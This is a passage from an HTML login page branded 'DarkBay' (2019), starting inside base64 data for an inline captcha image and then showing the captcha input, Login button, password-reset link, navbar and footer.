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" alt="">
                          </div>
                          <input class="form-control mt-3" type="text" name="captcha" placeholder="Enter Captcha">
                      </div>
                      <div class="form-group text-center">
                        <div class="row">
                          <div class="col-xs-12 col-md-4 offset-md-4">
                            <button type="submit" name="save" class="btn btn-outline-primary">Login</button>
                          </div>
                        </div>
                      </div>
                    </form>
                  </div>
                </div>
              </center>
            </div>
            <center>
              <div class="mt-3">
                Forgot your password? <a href="forgotpassword.php" style="text-decoration: none">Reset it here</a>
              </div><br>
              <br>
            </center>
          </div>
        </div>
        <div class="col-md-11">
          <br>
        </div><br>
        <div class="col-md-11">
          <nav class="navbar navbar-expand-lg navbar-light bg-light">
            <a class="navbar-brand"><i class="fas fa-sign-in-alt"></i> Login</a> <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button>
          </nav>
        </div>
      </div>
    </div><br>
    <br>
    <br>
    <footer class="page-footer font-small blue">
      <div class="footer-copyright text-center py-3">
        Copyright: <i class="far fa-copyright"></i> 2019 DarkBay
      </div>

    </footer>
  </div>
</body>
</html>
